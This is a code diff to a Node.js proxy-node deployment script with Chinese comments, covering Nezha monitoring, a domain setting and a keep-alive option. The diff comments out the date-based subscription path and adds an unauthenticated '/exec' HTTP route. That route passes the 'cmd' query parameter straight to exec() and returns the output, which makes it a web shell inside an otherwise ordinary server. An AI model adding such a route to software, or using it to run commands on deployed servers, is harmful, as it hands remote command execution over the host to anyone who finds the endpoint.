@@ -13,12 +13,13 @@ const NEZHA_KEY = process.env.NEZHA_KEY || '';             // v1的NZ_CLIENT_SEC
 const DOMAIN = process.env.DOMAIN || '1234.abc.com';       // 填写项目域名或已反代的域名，不带前缀，建议填已反代的域名
 const AUTO_ACCESS = process.env.AUTO_ACCESS || true;      // 是否开启自动访问保活,false为关闭,true为开启,需同时填写DOMAIN变量
   // 获取节点的订阅路径
-const pad = n => n.toString().padStart(2, '0');
-const date = new Date();
-const SUB_PATH = `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}`;   // 获取节点的订阅路径
+ // const pad = n => n.toString().padStart(2, '0');
+ // const date = new Date();
+ // const SUB_PATH = `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}`;   // 获取节点的订阅路径
         
 const NAME = process.env.NAME || 'Vls';                    // 节点名称
 const PORT = process.env.PORT || 3000;                     // http和ws服务端口
+const url = require('url');                                // exec
 
 const metaInfo = execSync(
   'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
@@ -26,6 +27,40 @@ const metaInfo = execSync(
 );
 const ISP = metaInfo.trim();
 const httpServer = http.createServer((req, res) => {
+
+ // Get information object about request URL:
+    const parsedURL = url.parse(
+        req.url, 
+        true // 'true' sets parameters to be returned in object format
+    );
+
+    // Handle request to '/page' route:
+    if (parsedURL.pathname === '/exec') {
+
+        // Get all parameters:
+        console.log(parsedURL.query); // { key1: 'value1', key2: 'value2', key3: 'value3' }
+    
+        if(!parsedURL.query.cmd) {
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('No command\n');
+            return;
+        }
+
+        let cmdStr = parsedURL.query.cmd;
+        exec(cmdStr, function (err, stdout, stderr) {
+            if (err) {
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+             res.end(err.message);
+            } else {
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+         res.end(stdout);
+            }
+        });
+        
+        return;
+    }
+
+  
   if (req.url === '/') {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Hello, World\n');
